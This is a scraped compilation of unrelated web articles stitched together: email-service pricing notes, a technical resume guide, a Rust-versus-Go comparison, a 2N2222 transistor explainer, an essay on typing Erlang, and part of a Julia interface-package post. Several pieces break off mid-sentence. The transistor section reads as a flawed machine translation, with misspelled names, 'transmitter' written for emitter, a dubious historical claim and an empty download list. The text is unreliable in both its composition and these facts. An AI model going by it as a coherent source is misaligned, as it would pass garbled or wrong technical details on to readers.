<p><strong>Mailgun</strong>’s one dedicated IP address starts with the Foundation plan ($35) for 100k emails and up ($75). You might consider going for the growth plan ($80) already with 1000 email address validations included.</p>

<p><strong>SendGrid</strong> starts the email validation at $89.95, but only for 2500 emails.</p>

<p><strong>Postmark</strong> charges for dedicated IP address extra ($50), but for any volume.</p>

<p><strong>Mandrill</strong> is a transactional email service from Mailchimp. Transactional email is available as an add-on to Standard ($14.99) and Premium plans. I included the Standard plan for keeping 500 contacts). Charges extra for a dedicated IP address ($29.95) for any volume.</p>

<p><strong>Sendinblue</strong> offers discounts for yearly payments. Dedicated IP address are offered only in the Enterprise plan without published pricing.</p>

<p><strong>Pepipost</strong> has great pricing for higher volumes. The mentioned $25/month gives you actually 150000 emails. 1 million can be as cheap as $171 for paying yearly.</p>

<p><strong>Mailjet</strong> free offering inserts a logo. $398.95 gets you 900k, then you have to switch to the Enterprise plan.</p>

<p><strong>Amazon SES</strong> pricing can get little confusing like anything in AWS. 62000 free emails in a month are for projects hosted in Amazon EC2 without data transfer fees. In general, you pay $0.10 for every 1000 emails sent, $0.12 for 1GB of attachments, and transfers.</p>

<p>They are some more services out there to consider, but I wanted to start with something famous and solid. Let me know on Twitter what should I add to the list.</p>

November 6, 2020 | https://www.meetleet.com/blog/how-to-write-a-great-technical-resume | <a href="https://web.archive.org/web/*/https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>At MeetLeet, we write <a href="https://signup.meetleet.com/">great technical resumes for free</a>, for any technology professional in the US or Canada with 2+ years of experience. As a result, we’ve learned a lot about writing technical resumes.</p><p>A great technical resume gets you ahead in your career. The way companies hire can seem mysterious and cryptic, but it’s not too complicated in reality. Companies have processes for how they hire, and just like any system, if you know the rules it’s easy to reverse engineer what you need to do.</p><p>To help a hiring manager make technology hires, a company typically has HR staff, and sometimes a recruiter. The software they use to track interviews or job applicants is called an Applicant Tracking System (ATS). MeetLeet writes a great technical resume that appeals to each of these audiences.</p><p>Here’s how.</p><h3>Professional headline </h3><p>The professional headline summarizes your role and level. For easy comprehension, it sums up your professional standing in a few words - a short phrase that serves as shorthand for your career. Great professional headlines include: </p><ul><li>“Passionate Open Source Engineer”,</li><li>“Top-performing BI Analyst”,</li><li>“Innovative Machine Learning Expert”,</li><li>“Successful Front-end Engineer”, or </li><li>“Dedicated DevOps Professional”. </li></ul><p>A clear professional headline helps you get seen by managers looking to hire professionals like you.</p><h3>Four job titles you’d accept</h3><p>After your professional headline, you’ll share four job titles you’d actually accept for your next job. These are not necessarily past roles or job titles you’ve already had. Instead, these are the job titles resume readers should consider you for in your next job. This may seem really obvious to you, but it’s not obvious to the HR staff or your future boss – help them out by documenting very clearly your intended path forward.</p><h3>Professional summary</h3><p>The next three lines of your professional summary describe your most important, most relevant attributes.</p><p>The second line of the professional summary is capabilities, skills, talents. These are your top 4 most differentiated skills in the market.  Highlight skills that indicate you’re ready for the 4 job titles listed above. </p><p>The third line covers performance. What types of achievements have you had that prove you have the skills and capabilities listed above? What specific factual details can you summarize here? (You’ll explain them in detail in the <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points </a>below.)</p><p>The fourth line covers career highlights - awards, promotions, truly distinguishing achievements or industry recognitions.</p><p>And please note, if you have less than 8 years of experience, we’ll typically collapse the professional summary from 4 lines into just 2.</p><h3>Work experience </h3><p>The most common mistake engineers make in their <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">work experience section</a> is copying and pasting their job description. The readers of your resume already know what the duties and responsibilities of a ‘software engineer’ or a ‘full-stack engineer’ are. So repeating them on your resume doesn’t help you. </p><p>What they are looking for instead is details about what did you actually achieve in the job? Why was your previous employer better because you were there? Did you reduce latency? Increase throughput? Shave seconds off loading time? Build a system that could handle more capacity? </p><p>For technologists, this is an area where resumes actually favor your strong suit: numbers, not words. It’s always better to show your expertise by <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">sharing the numbers</a>. Numbers are objective, they are facts, and they help readers understand precisely what you did. For each role on your resume, we’ll ask for numbers that detail your success.</p><p>Examples of good numbers to share:</p><ul><li>Load time reduced by xx ms</li><li>Site engagement increased by xx%</li><li>Bug fix time reduced by xx days</li><li>Data usage reduced by xx %</li><li>Revenue increased by xx %</li><li>etc.</li></ul><p>Anything where you can <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">quantify</a> the specific improvements that happened because you were the engineer on the job.</p><h3>Technologies</h3><p>We list the technologies you’ve used at the end. For more experienced engineers, your particular technology stack may matter less than your overall track record. While for more junior engineers, the placement on the first (and only) page means this important data is at the fingertips of hiring managers and recruiters.</p><p>I hope this overview has been helpful. MeetLeet helps technologists get ahead in their careers by <a href="https://signup.meetleet.com/">writing great technical resumes for free</a>. We’d love for you to sign up.</p></div></div></div></div>]]>

Which language should you choose for your next project, and why? How do the two compare in areas like performance, simplicity, safety, features, scale, and concurrency? What do they have in common, and where do they fundamentally differ? Let's find out, in this friendly and even-handed comparison of Rust and Golang, from the author of the <a href="https://bitfieldconsulting.com/books/">For the Love of Go</a> book series.</p>
<h2 id="rust-and-go-are-both-awesome">Rust and Go are both awesome</h2>
<p>First, it's really important to say that <em>both Go and Rust are absolutely excellent programming languages</em>. They're modern, powerful, widely-adopted, and offer excellent performance. You may have read articles and blog posts aiming to convince you that Go is better than Rust, or vice versa. But that really makes no sense; every programming language represents a set of trade-offs. Each language is optimised for different things, so your choice of language should be determined by what suits you and the problems you want to solve with it.</p>
<p>In this article, I'll try to give a brief overview of where I think Go is the ideal choice, and where I think Rust is a better alternative. Ideally, though, you should have a working familiarity with both languages. While they're very different in syntax and style, both Rust and Go are first-class tools for building software. With that said, let's take a closer look at the two languages.</p>
<h2 id="the-similarities">The similarities</h2>
<p>Rust and Go have a lot in common, which is one reason you often hear them mentioned together. What are some of the common goals of both languages?</p>
<blockquote>
<p>Rust is a low-level statically-typed multi-paradigm programming language that’s focused on safety and performance.<br>
—<a href="https://serokell.io/blog/rust-guide">Gints Dreimanis</a></p>
<p>Go is an open source programming language that makes it easy to build simple, reliable, and efficient software.<br>
—<a href="https://golang.org/">Golang.org</a></p>
</blockquote>
<h3 id="memory-safety">Memory safety</h3>
<p>Both Go and Rust belong to the group of modern programming languages whose priority is <em>memory safety</em>. It's become clear over many decades of using older languages such as C and C++ that one of the biggest causes of bugs and security vulnerabilities is accessing memory unsafely or incorrectly. Rust and Go deal with this problem in different ways, but both aim to be smarter and safer than other languages about managing memory, and to help you write correct and performant programs. </p>
<h3 id="fast-compact-executables">Fast, compact executables</h3>
<p>They're both compiled languages, which means your programs are translated directly to executable machine code, so that you can deploy your program as a single binary file; unlike interpreted languages such as <a href="https://bitfieldconsulting.com/golang/golang/go-vs-python">Python</a> and Ruby, you don't need to distribute an interpreter and lots of libraries and dependencies along with your program, which is a big plus. This also makes both Rust and Go programs extremely fast in comparison to interpreted languages.</p>
<h3 id="general-purpose-languages">General-purpose languages</h3>
<p>Rust and Go are also both powerful, scalable general-purpose programming languages, which you can use to develop all kinds of modern software, from web applications to distributed microservices, or from embedded microcontrollers to mobile apps. Both have excellent standard libraries and a thriving third-party ecosystem, as well as great commercial support and a large user base. They've both been around for many years, and will continue to be widely used for years to come. Learning either Go or Rust today will be a sound investment of your time and effort.</p>
<h3 id="pragmatic-programming-style">Pragmatic programming style</h3>
<p>Neither are primarily functional languages (like Scala or Elixir, for example), and neither are exclusively object-oriented (like Java and C#). Instead, while both Go and Rust have features associated with functional and object-oriented programming, they're pragmatic languages aimed at solving problems in whatever way is most appropriate, rather than forcing you into a particular way of doing things. (If you like the functional style of programming, though, you’ll find a lot more facilities for it in Rust, because Rust <em>has</em> a lot more facilities than Go in general.)</p>
<blockquote>
<p>We can debate about what an ‘object-oriented’ language is, but it’s fair to say that the <em>style</em> of object-oriented programming that C++, Java, or C# users would expect is not present in either Go or Rust.<br>
—Jack Mott</p>
</blockquote>
<h3 id="development-at-scale">Development at scale</h3>
<p>Both Rust and Go have some useful features which make them suitable for programming in the large, whether that means large teams, or large codebases, or both.</p>
<p>For example, whereas C programmers have argued for years about where to put their brackets, and whether code should be indented with tabs or spaces, both Rust and Go eliminate such issues completely by using a standard formatting tool (<code>gofmt</code> for Go, <code>rustfmt</code> for Rust) which rewrites your code automatically using the canonical style. It’s not that this particular style is so wonderful in itself: it’s the <em>standardisation</em> which Rust and Go programmers appreciate.</p>
<blockquote>
<p><code>gofmt</code>’s style is no one’s favourite, yet <code>gofmt</code> is everyone’s favourite.<br>
—<a href="https://www.youtube.com/watch?v=PAAkCSZUG1c&amp;t=8m43s">Rob Pike</a></p>
</blockquote>
<p>Another area where both languages score highly is in the build pipeline. Both have excellent, built-in, high-performance standard build and dependency management tools; no more wrestling with complex third-party build systems and having to learn a new one every couple of years.</p>
<blockquote>
<p>Building Go and Rust code, having come from a Java and Ruby background in my early career, felt like an impossible weight off my shoulders. When I was at Google, it was a relief to come across a service that was written in Go, because I knew it would be easy to build and run. This has also been true of Rust, though I've only worked on that at much smaller scale. I'm hoping that the days of infinitely configurable build systems are dead, and languages all ship with their own purpose-built build tools that just work out of the box.<br>
—<a href="https://samwho.dev/">Sam Rose</a></p>
</blockquote>
<h2 id="so-what-s-all-the-fuss-about-">So what’s all the fuss about?</h2>
<p>With all that in mind, and seeing that both languages are so well-designed and powerful, you might be wondering what all the holy wars are about (me too). Why do people make such a fuss about 'Go versus Rust', getting into angry social media spats and writing long blog posts about how only an idiot would use Rust, or that Go isn't a real programming language, or whatever. It might make them feel better, but it doesn't exactly help you, as someone trying to decide which language to use for your project, or which you should learn to advance your programming career. A wise person doesn't make important choices based on who shouts the loudest.</p>
<p>Let's continue our grown-up discussion now by looking at some areas where a reasonable person might prefer one language over the other.</p>
<h2 id="performance">Performance</h2>
<p>We've said that both Go and Rust produce extremely fast programs because they're compiled to native machine code, without having to go through an interpreter or virtual machine. However, Rust's performance is particularly outstanding. It's comparable with C and C++, which are often regarded as the highest-performance compiled languages, but unlike these older languages, it also offers memory safety and concurrency safety at essentially no cost in execution speed. Rust also allows you to create complex abstractions without paying a performance penalty at run-time.</p>
<p>By comparison, although Go programs also perform extremely well, Go is primarily designed for speed of <em>development</em> (including compilation), rather than speed of execution. The Go compiler doesn’t spend a lot of time trying to generate the most efficient possible machine code; it cares more about compiling lots of code quickly. So Rust will usually beat Go in run-time benchmarks.</p>
<p>Rust’s run-time performance is also consistent and predictable, because it doesn’t use garbage collection. Go’s garbage collector is very efficient, and it’s optimised to make its stop-the-world pauses as short as possible (and getting shorter with every new Go release). But garbage collection inevitably introduces some unpredictability in the way programs behave, which can be a serious issue in some applications, such as embedded systems.</p>
<p>Because Rust aims to give the programmer complete control of the underlying hardware, it's possible to optimise Rust programs to be pretty close to the maximum theoretical performance of the machine. This makes Rust an excellent choice for areas where speed of execution beats all other considerations, such as game programming, operating system kernels, web browser components, and real-time control systems.</p>
<h2 id="simplicity">Simplicity</h2>
<p>It doesn't matter how fast a programming language is if nobody can figure out how to use it. Go was deliberately conceived as a reaction against the ever-growing complexity of languages like C++; it has very little syntax, very few keywords, and, indeed, few features. This means it doesn't take long to learn the Go language to the point where you can write useful programs in it.</p>
<blockquote>
<p>Go is incredibly easy to learn. I know this is an often-touted benefit, but I was really surprised at how quickly I was able to be productive. Thanks to the language, docs, and tools, I was writing interesting, committable code after literally two days.<br>
—<a href="https://medium.com/better-programming/early-impressions-of-go-from-a-rust-programmer-f4fd1074c410">Early Impressions of Go From a Rust Programmer</a></p>
</blockquote>
<p>The key word here is <em>simplicity</em>. Simple isn't the same as easy, for sure, but a small, simple language is easier to learn than a large, complex one. There just aren't that many different ways to do things, so all well-written Go code tends to look the same. It’s easy to just dive into an unfamiliar service and understand what it’s doing.</p>
<pre><code>fmt.Println("Gopher's Diner Breakfast Menu")
for dish, price := range menu {
    fmt.Println(dish, price)
}</code></pre>
<p>Although the core language is small, Go’s standard library is very powerful. That means your learning curve will also need to include the parts of the standard library that you need, not just Go syntax. On the other hand, moving functionality out of the language and into the standard library means that you can focus on learning only the libraries that are relevant to you right now.</p>
<p>Go is also designed for software development at scale, with large codebases and large teams. In these situations, …</p></div></div></div>

<p>The <strong>transistor 2N2222 or PN2222</strong> is another of the most used transistors together with BC548. So, if you like DIY and you are a maker, surely at some point you have needed one of these devices. In this case, the PN2222 is a low power silicon transistor and designed for linear amplification and switching applications.</p>
<p>The reason it is so in demand is that it is good at amplifying small currents and small to medium voltages, as well as being able to work at medium high frequencies. That means that it has a general use and is quite popular among radio amateurs. Those who are will know that it is one of the transistors used for the construction of the BITX transceiver, or that it allowed the Norcal Amateur Radio Club to launch in 1999 a challenge to build a radio transceiver with only 22 such transistors without any additional ICs.</p>


<p>Like BC548 it is manufactured by epitaxy processes. It is also a <strong>bipolar transistor and NPN</strong> type. At present it has several possible encapsulations, such as plastic TO-92, which is usually the most common form of presentation, and also others such as TO-18, SOT-23, SOT-223, etc.</p>

<h2><span id="What_exactly_is_a_transistor">What exactly is a transistor?</span></h2>
<p><img src="https://www.oshardware.net/wp-content/uploads/2019/05/bardeen-brattain-shockley.jpeg" alt="Bardeen Brattain and Shockley with the contact transistor" width="830" height="352" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20830%20352'%3E%3C/svg%3E" data-lazy-src="https://www.oshardware.net/wp-content/uploads/2019/05/bardeen-brattain-shockley.jpeg"></p>
<p>Since <strong>the radio or transistor</strong> was named after this device we talked about, I would like to make a very brief introduction about what a transistor is and a little bit of history. Transistors are nothing more than devices similar to switches and with the ability to amplify the signal. That is to say, they are the substitutes of the primitive vacuum tubes or vacuum valves that gave so many problems.</p>
<p>These valves were similar to traditional light bulbs, so they could melt and had to be replaced frequently. They were also very large and did not allow the creation of small appliances. The heat they generated was also a problem. With the advent of solid-state electronics, that is, semiconductors, they allowed the creation of this type of device that was much cheaper, smaller and more reliable.</p>
<p>The name transistor comes from the union of <strong>transfer and resistor</strong>, i.e. a transfer resistor in English. Remember that a resistor is a resistor. Moreover, as you know, the invention arises in Europe with the first patents of the physicist Lilienfeld (1925). It was somewhat ahead of its time, since no practical applications were found for it in that decade or the next, and it was a field effect transistor, a more advanced concept even than bipolars.</p>
<p>Oskar Heil also made a similar device in Germany in 1934, and later Robert Pohl and Rudolf Hilsch would also do experiments related to this type of device at a German university. Almost in parallel, in the United States in the Bell Labs of the AT&amp;T experiments were also being done without success, until after World War II the luck changed for them and when they returned from the European battlefield they found the solution by coming up with the “refreshed” ideas.</p>
<p><strong>John Bardeen, Wlater Brattain and William Shockley</strong> took the credit for patenting the first transistor in history and winning the Nobel Prize. In 1948 they invented the contact transistor, a very large, very rough and impractical device that was expensive to manufacture and used to fail sometimes and had to be replaced in some cases. From that point they would evolve to the current transistors.</p>
<p>But if you want to know exactly how this device that revolutionized electronics and the technological world works, here I leave you this GIF with a simile of a transistor and a hydraulic system, which I think you will not find better than this example to capture the idea of the operation of a transistor:</p>
<p><img src="https://www.oshardware.net/wp-content/uploads/2019/05/Transistor_animation.gif" alt="GIF of transistor operation compared to a water system" width="640" height="480" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20640%20480'%3E%3C/svg%3E"></p>
<p>It can be seen that when a current is supplied to the base of the NPN transistor the current passes from the collector to the transmitter. But it makes it amplified, because if you look at the image, the water flow from the base and from the collector is added. It is a quite simple <strong>similar</strong>, although in the electronic system you should replace the water by electrons .</p>
<p>If you want to see a slightly more enlightening picture from the point of view of the operation of the semiconductor zones, i.e. of<strong> the load carriers</strong>, here is this other picture:</p>
<p><img src="https://www.oshardware.net/wp-content/uploads/2019/05/npn-funcionamiento.jpg" alt="Load carriers in NPN" width="830" height="460" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20830%20460'%3E%3C/svg%3E" data-lazy-src="https://www.oshardware.net/wp-content/uploads/2019/05/npn-funcionamiento.jpg"></p>
<p>In the picture you can see that when a negative voltage is applied to the emitter, it pushes the negative charge carriers (electrons) and at the base the positive charge carriers (holes) “absorb”<strong> electrons so that they can jump into the collector</strong> .</p>
<blockquote><p>In the case of a PNP it would be similar, but it changes the polarizations or ways of connecting the transistor.</p></blockquote>
<h2><span id="Characteristics_of_2n2222">Characteristics of 2n2222:</span></h2>

<p>The 2N2222 or PN2222 is often manufactured by Philips Semiconductor, although we can also find other manufacturers such as the historic Fairchild Semiconductor, the German Siemens, COMSET Semiconductor, SEMICOA, etc. It has a <strong> variant called 2N2222A</strong>.</p>
<p>The 2N2222A is TO-18 metal encapsulated and qualified for use in military applications (MIL-STD) for its ruggedness, acceptable temperature range, etc. If we look at the datasheets provided by these manufacturers, the characteristics that we will find in this transistor are</p>
<ul>
<li>Emitter collector voltage at cut-off: 50V</li>
<li>Constant collector current: 800mA</li>
<li>Power dissipation: 500mW</li>
<li>Current gain: &gt;100hFE, typically 150 is reached.</li>
<li>Working frequency: 250-300 Mhz, which allows its application in high frequency radio</li>
<li>Type: Bipolar NPN</li>
<li>Packages: TO-92 plastic, TO-18 metal, SOT-23 and SOT-223, these last two are SMD type.</li>
<li>Complementary (PNP): 2N2907</li>
<li>Equivalent: you can use the BC548 we saw in the previous post, but remember to turn it 180º when inverting the collector and emitter pins . You could also use the 2N3904 with very similar characteristics, but it can only carry one tenth of the current supported by the 2N2222. If the circuit is only for small signals, it could be perfectly replaced. Also the 2N2219 is similar, but for more power. In this case, as it has a TO-39 format (up to 3w) and supports up to 300 Mhz, it can be used in transmitters and amplifiers for HF and VHF and even some UHF cases with output powers of 1 to 2 watts.</li>
<li>SMD equivalent: for surface mounting there is a 2n2222 SMD transistor with SOT-23 encapsulation.</li>
</ul>
<h2><span id="Datasheet">Datasheet:</span></h2>
<p><img src="https://www.oshardware.net/wp-content/uploads/2019/05/datasheet-2n2222A.jpg" alt="datasheet del 2n2222A" width="830" height="505" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20830%20505'%3E%3C/svg%3E" data-lazy-src="https://www.oshardware.net/wp-content/uploads/2019/05/datasheet-2n2222A.jpg"></p>
<p>A <strong>datasheet is a document</strong>, usually a PDF, with the detailed characteristics of the electronic device. They are created by the manufacturer himself with the peculiarities of his product, therefore, we can find that there are not the same parameters in two datasheets on a 2n2222 from different manufacturers. Here you can download some of them:</p>
<ul>

<p>I hope this guide about 2N222 or PN2222 helped you.</p>

<h2>Intro</h2>
<p>I heard before that Erlang and the BEAM did not pack a static type system
because their creators <em>“couldn’t build it”</em>.</p>
<p>That is nonsense.</p>
<p>While building a sophisticated, reliable and scalable type checker is
absolutely not a walk in the park, building one that works is not that hard.</p>
<p>If it could have been done, it would’ve been done, and it would’ve been
hardened by the same process OTP was hardened and turned into what it is today:
a reliability gold standard.</p>
<p>So I decided to write an Erlang type-checker to really understand what is hard
about typing Erlang. I know Dialyzer exists, and its great, I just wanted to
get a good understanding from scratch.</p>
<p>It hit me that there is a split in here, that is sometimes hard to notice and
it makes a world of a difference. There is <strong>an Erlang language</strong>, called
Standard Erlang, and there is <strong>an Erlang Runtime</strong>, the BEAM. Along the same
lines as there is a Java language, and then there’s the JVM.</p>
<p>We tend to speak of these 2 things as if they were one, but if we isolate the
language from the runtime, we find that they exhibit very different behaviors.</p>
<p>In particular the runtime brings to the table <em>distribution</em> and  <em>hot code
reloading</em>, which makes typing things a distributed-systems problem. Fun, yes,
but very impractical.</p>
<p>On following essays I’ll do a more thorough and formal treatise of the
operational semantics of the language and how to go about implementing your own
type-checker for it, the distributed and dynamic nature of the runtime, and how
they interact with each other.</p>
<p>Here I’ll go over what I’ve learned takes to type the Standard Erlang in a more
superficial way, and what are some thorny parts that we will encounter.</p>
<p>First, lets scope what actually <em>is</em> Standard Erlang.</p>
<h2>Standard Erlang</h2>
<p>Erlang is a dynamically, strongly typed language. It includes just a little
extra over your typical functional programming language. Overall, Erlang isn’t
<a href="https://github.com/erlang/otp/blob/master/lib/stdlib/src/erl_parse.yrl">that big a
language</a>.</p>
<p>My eye-ball estimation is that it is about a 3rd of the size of OCaml, and
about a 5th of the size of Java.</p>
<p>Here’s some Erlang:</p>
<pre><code>% an erlang module
-module(hello_world).

-export([hi/1]).  % &lt;-- this a compiler annotation

hi(noone) -&gt; sad;
hi(Name) -&gt; &lt;&lt;"Hello, ", (Name)/binary, "!"&gt;&gt;.
</code></pre>
<p>An Erlang program consists of a number of <code>modules</code>, each module is just a file
with a bunch of <code>functions</code> in it and a few <code>annotations</code> used to tell the
compiler what’s exported, who the module author is, what a function type is
supposed to be, etc.</p>
<p>There’s quite a few things you can write in Erlang that are relatively common:</p>
<ul>
<li>literals like booleans, numbers or strings</li>
<li>lists, maps, tuples, lambdas</li>
<li>ifs, try/catch, case</li>
<li>function calls and references</li>
</ul>
<p>And then there’s a few things that aren’t common at all:</p>
<ul>
<li>atoms, which are just constants</li>
<li>receive expressions</li>
<li>all sorts of pattern matching</li>
<li>everything is done through recursion</li>
</ul>
<p>But in general, the language expressivity comes from it being rather simple.
Most problems are solved by making functions that call each other, most
functions pattern match on exactly the data they need, loops are achieved
through recursion, and we’re done.</p>
<p>Exceptions are very common, since failing to pattern match will result in an
exception. For this the language supports the <code>catch</code>, and <code>try..catch..after</code>
expressions, but it is highly unidiomatic to use them.</p>
<p>The superb uptime through supervision that Erlang is known for is actually
baked into the runtime, not the language. The language itself has no notion of
processes, links, or sending messages. The only thing it does have is <em>receive</em>
expressions for <em>consuming messages</em>.</p>
<p>Armed with this understanding, lets dig into how we could type Erlang.</p>
<h2>Typing the Erlang Language</h2>
<p>In writing the type-checker, I’ve found a few things that are worth bringing up:</p>
<ol>
<li>Functions on Untagged Unions</li>
<li>Functions on Records</li>
<li>Functions on Tagged Unions (Variants)</li>
<li>Receive Expressions</li>
<li>Dynamic Dispatch and <code>M:F(A)</code> syntax</li>
</ol>
<p>There may be other language constructs that are not friendly to static
analysis. I’ll try to write and cover more in the future.</p>
<h3>1. Functions on Untagged Unions</h3>
<p>An Erlang value can have a single type but we expect that type to be known only
at runtime. This means that both the input and returning types of a function
are actually unknown <em>until</em> we run the function.</p>
<p>So whenever you see a function like <code>hi/1</code> above, calling it could actually
return a value of different types, depending on how the function was written.</p>
<p>For example, calling <code>hi(noone)</code> returns the atom <code>sad</code>. Instead, calling
<code>hi(&lt;&lt;"Joe"&gt;&gt;)</code> returns the string <code>&lt;&lt;"Hello, Joe!"&gt;&gt;</code>. The atom <code>sad</code> and the
string have different types. Calling <code>hi(0)</code> will result in an exception.</p>
<p>If we were to write down the type of this function we’d have to say something
like:</p>
<pre><code>hi(atom("noone") | string) -&gt; atom("sad") | string
</code></pre>
<p>This is present in every other dynamic language: Lisp, Lua, Javascript, Python,
Ruby, Smalltalk, you name it.</p>
<p>Writing a type-checker that deals with this is certainly possible, as it has
been done before in tools like <a href="https://abstractmachines.dev/posts/flow-type">Flow</a> and <a href="https://abstractmachines.dev/posts/typescript">TypeScript</a>,
but it certainly isn’t obvious how to.</p>
<p>To better understand how this can be dealt with, we need to talk about <a href="https://abstractmachines.dev/posts/union-types">Union
Types</a>.</p>
<p><strong>Union types</strong> allow us to express that a value may belong to one of many
different types at the same time. E.g, <code>1</code> is a <code>number</code>, but it is also a
<code>(number | bool)</code>. In the same way, <code>true</code> is a <code>bool</code>, but it is also a
<code>(number | bool)</code>.</p>
<p>We read <code>(number | bool)</code> as “number or bool”.</p>
<p>The key here is that the value itself doesn’t have explicit information about
which type from the union it actually belongs to, and we’re bound to find this
out through <em>refinements</em>.</p>
<p>We can do these refinements in 2 ways through the use of guards and pattern
matching.</p>

<p><strong>Through the use of guards</strong> we can refine the actual type of a value into a
single type. For example:</p>
<pre><code>% the infamous left_pad function
left_pad(A, B) when is_binary(A) -&gt; &lt;&lt;(A)/binary, (B)/binary&gt;&gt;;
left_pad(A, B) when is_number(A) -&gt; left_pad(binary:copy(&lt;&lt;" "&gt;&gt;, A), B).
</code></pre>
<p>This function is has the following signature:</p>
<pre><code>left_pad( string | number, string ) -&gt; string
</code></pre>
<p>But it is thanks to the guards <code>is_binary/1</code> and <code>is_number/1</code> that we <em>refine</em>
the type of the inputs to be just <code>string</code> or just <code>number</code>.</p>
<p>This makes it possible to say that <code>binary:copy(&lt;&lt;" "&gt;&gt;, A)</code> is safe, because
at that point we know that <code>is_number(A)</code> was true, and so <code>A</code>’s type has been
refined from <code>string | number</code> to just <code>number</code>. Otherwise the guard would have
been false.</p>
<p>However, we can’t use any function as a guard. We must use only built-in
functions that already come with the Erlang runtime.</p>
<p>This makes it impossible to write arbitrary refinement logic, which makes the
approach rather limited.</p>

<p><strong>Through pattern matching</strong> we can do something very similar, and establish
our expectations of the values. For example:</p>
<pre><code>% a good old list length counter
count(A=[_|_]) -&gt; count(A, 0).

count([], C) -&gt; C;
count([_|T], C) -&gt; count(T, C+1).
</code></pre>
<p>In this case, we are guaranteed that if our function pattern matches, then <code>A</code>
will be a list.</p>
<p>We don’t really know what the list elements are, but of course we can try and
continue pattern matching and using guards until we refine it “enough”.</p>
<p>These two approaches, while composable, have the unfortunate property that they
don’t generalize to all kinds of data. They should work well tho for: atoms,
literals, and anything that there is a guard available for.</p>
<p>Anything where our data is one of type <em>or</em> another, would fall into this
category.</p>
<p>Maps, tuples, and records can work with this, but it doesn’t scale very well.
You essentially have to add the new map/tuple/record name to the union every
time you want it supported. Even if you need a single field out of them.</p>
<p>In the next section we’ll see a different approach for dealing with this data
that scales much better.</p>
<h3>2. Functions on Record Types</h3>
<p>When working with functions that take as inputs many values packed into one, be
it with records, maps, or tuples, we’re faced with a different issue: we don’t
care what the input type is <em>as long as it has what we need in it</em>.</p>
<p>For example, if we have two possible maps that share some things, both of them
could be thought of as their own separate type, and these 2 types would have
something in common.</p>
<pre><code>% this has type 'character'
Character = #{ name =&gt; "Alexander Hamilton", play =&gt; "Hamilton" }.

% this has type 'performer'
Performer = #{ name =&gt; "Lin-Manuel Miranda" }.
</code></pre>
<p>Now if we make a function to get the name of a Performer:</p>
<pre><code>name(#{ name := Name }) -&gt; Name.
</code></pre>
<p>and we give it a type:</p>
<pre><code>name(performer) -&gt; string.
</code></pre>
<p>Would we expect this function to work on Characters?</p>
<p>My answer is yes, since Characters also have a <code>name</code> fields.</p>
<p>In fact, I’d say that it will work just fine for any map <em>as long as it has a
name key that is a string</em>.</p>
<p>So the type of our function isn’t quite <code>(character | performer)</code>. It actually
is “Any map as long as it has a name key that is a string”. I’ll use this
notation for that: <code>#{ name }</code></p>
<pre><code>name(#{ name : A }) -&gt; A
</code></pre>
<p>Some type-systems support this with Structural Subtyping, some others use Row
Polymorphism. The main difference isn’t obvious in this getter function, but
becomes obvious in the next one, a setter:</p>
<pre><code>with_name(Name, M=#{ name := _ }) -&gt; M#{ name =&gt; Name }.
</code></pre>
<p><strong>The structural subtyping approach</strong> would say that whatever you put in, it is
now known to only have a <code>name</code> key. So all your other keys have disappeared
(to the eyes of the type-system) and if you want to recover them you have to do
some sort of casting. This is due to a subtyping behavior called <em>subsumption</em>
and its the way that TypeScript handles this.</p>
<p><strong>The row polymorphic approach</strong> has no information loss, and instead carries
around the rest of the fields that <code>M</code> had. This is how OCaml and PureScript
handles this. In PureScript this works for record types and in OCaml this is</p></section></section></div>

  <p><span>06 Nov 2020</span></p>
  <p>Over the last two years, our Julia codebase has grown in size and complexity, and is now the centerpiece of both our operations and research.
This implies that we need to routinely replace parts of the system like puzzle pieces, and carefully test if the results lead to improvements along various dimensions of performance.
However, those pieces are not designed to work in isolation, and thus cannot be tested in a vacuum.
They also tend to be quite large and complex, and therefore often need to be independent packages, which need to “fit” together in precise ways determined by the rest of the system.
This is where interfaces come in handy: they are tools for isolating and precisely testing specific pieces of a large system.</p>

<p>In order to have the option of reusing an interface without pulling in a lot of extra code, we avoid embedding the interface into any package using it, allowing it to exist in a package on its own.
This approach also makes it easier to keep track of the changes to the interface, when these are not tied to unrelated changes in other packages.
This results in a set of very slim interface packages that define what functional pieces need to be filled in and how they should fit.</p>

<h2 id="interface-packages">Interface Packages</h2>

<p>For our purposes, an interface package is any Julia package that contains an abstract type with no concrete implementation—a sort of IOU in code.
Most functions defined for the type are either un-implemented or are based on other, un-implemented functions.
Despite having very little code, the docstrings form a sort of contract laying out what methods a concrete implementation should have and what they should do in order for the implementation to be considered valid.
A package implementing the interface but missing methods or using different function signatures from interface package can be said to break the contract.
As long as the contract between the concrete and abstract interface remains unbroken, a package using the interface should be able to swap out any concrete implementation for any other and still run as expected provided the user package is using the interface as documented.</p>

<p>In order to improve the modularity of the code, they are separated from the code that uses the abstract type.
This results in interface packages essentially looking like design documents.
For example, below we sketch an interface package for a database.</p>

<div><div><pre><code><span>module</span> <span>AbstractDB</span>

<span>"""
    AbstractDB

A simple API for read only access to a database.
"""</span>
<span>abstract type</span><span> AbstractDB</span> <span>end</span>

<span>"""
    AbstractResponse

Query data needed for fetch.
"""</span>
<span>abstract type</span><span> AbstractResponse</span> <span>end</span>

<span>"""
    query(
        db::AbstractDB,
        table::String,
        features::Vector{Feature}
    ) -&gt; AbstractResponse

Submit an appropriate query to `table` in `db` asking for results matching
`features`.
"""</span>
<span>function</span><span> query</span> <span>end</span>


<span>"""
    fetch(
        db::AbstractDB,
        response::Union{Response,Vector{Response}}
    ) -&gt; DataFrame

Retrieve the results from `response` and parses them into a `DataFrame`.
"""</span>
<span>function</span><span> fetch</span> <span>end</span>

<span>"""
    easy_query(
        db::AbstractDB,
        table::String,
        features::Vector{Feature}
